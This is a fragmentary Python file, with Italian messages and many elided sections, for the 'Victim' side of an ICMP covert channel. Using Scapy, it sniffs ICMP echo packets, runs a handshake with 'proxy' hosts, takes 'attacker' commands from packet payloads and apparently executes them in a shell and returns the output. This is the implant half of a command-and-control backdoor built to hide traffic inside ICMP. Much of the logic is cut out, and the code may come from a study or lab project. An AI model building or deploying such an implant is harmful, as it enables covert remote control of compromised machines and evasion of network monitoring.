...
#---------------------
def send_lastpacket_toall_proxies(proxy_list:list=None):
    try:
...
def choose_proxy(proxy_list:list=None):
...
def callback_wait_for_command(packet): 
    print(f"callback wait_for_command received:\n\t{packet.summary()}") 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
        if packet[IP].src in testclass.connected_proxy and com.CONFIRM_COMMAND.encode() in packet[Raw].load:
            command=packet[Raw].load.decode().replace(com.CONFIRM_COMMAND,"")
            checksum=com.CONFIRM_COMMAND+command
...
def add_proxy_to_connected_list(ip_src): 
    testclass.lock_connected_proxy.acquire()
    if ip_src not in testclass.connected_proxy:
        testclass.connected_proxy.append(ip_src) 
    testclass.lock_connected_proxy.release() 
...
def is_proxy_already_connected(proxy:str=None):
    try:
        ...
        raise Exception(f"done_waiting_timeout: {e}")
    testclass.lock_connected_proxy.acquire()
    is_already_connected=proxy in testclass.connected_proxy
    testclass.lock_connected_proxy.release() 
...
def callback_wait_conn_from_proxy(packet): 
    ...
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        ...
        if is_proxy_already_connected(packet[IP].src): 
            print(f"already connected with {packet[IP].src}:\n\t{testclass.connected_proxy}")
            return
        confirm_text=(com.CONFIRM_PROXY+testclass.ip_host).encode()
        ...
        if confirm_text in packet[Raw].load and checksum==packet[ICMP].id: 
            ...
            if testclass.confirm_conn_to_proxy(packet[IP].src):
                add_proxy_to_connected_list(packet[IP].src) 
                return
...
def get_value_of_parser(args):
    ...
    return {
        ...
        ,"gateway_host":mymethods.calc_gateway(args.ip_host)
        ,"num_proxy":args.num_proxy
    }

def check_value_in_parser(args): 
    if not isinstance(args, argparse.Namespace) or args is None:
        raise ValueError("check_value_in_parser: argomento passato non corretto") 
...
class Victim:
    def __init__(self):
        ...
        value_parser=get_value_of_parser(args)
        self.ip_host=value_parser.get("ip_host")
        self.gateway_host=value_parser.get("gateway_host")
        self.num_proxy=value_parser.get("num_proxy") 
        #
        self.connected_proxy=[]
        self.lock_connected_proxy=threading.Lock()

    def wait_conn_from_proxy(self): 
        confirm_text=com.CONFIRM_PROXY+self.ip_host
    ...
    def confirm_conn_to_proxy(self,ip_src): 
        data=(com.CONFIRM_VICTIM+self.ip_host+ip_src).encode()
        if com.send_packet(data,ip_src):
            print(f"Reply: {ip_src} ha risposto")
            return True
        print(f"No-Reply: {ip_src} non ha risposto")
        return False
    
    def wait_command_send_data(self):
        print("\n\t(─‿─)\twait_command_send_data\n")
        try:
            command=testclass.wait_attacker_command() 
            process_shell=None
        except Exception as e:
    ...
    def wait_attacker_command(self): 
        ...
        args={
            "filter":f"icmp and icmp[0]==8 and dst {self.ip_host}" 
            #,"count":1 
...
if __name__ == "__main__": 
    try:
        global lock_update_connected_proxy
        lock_update_connected_proxy=threading.Lock()
        global testclass
        testclass=Victim()
    except Exception as e:
        print(f"main: {e}")
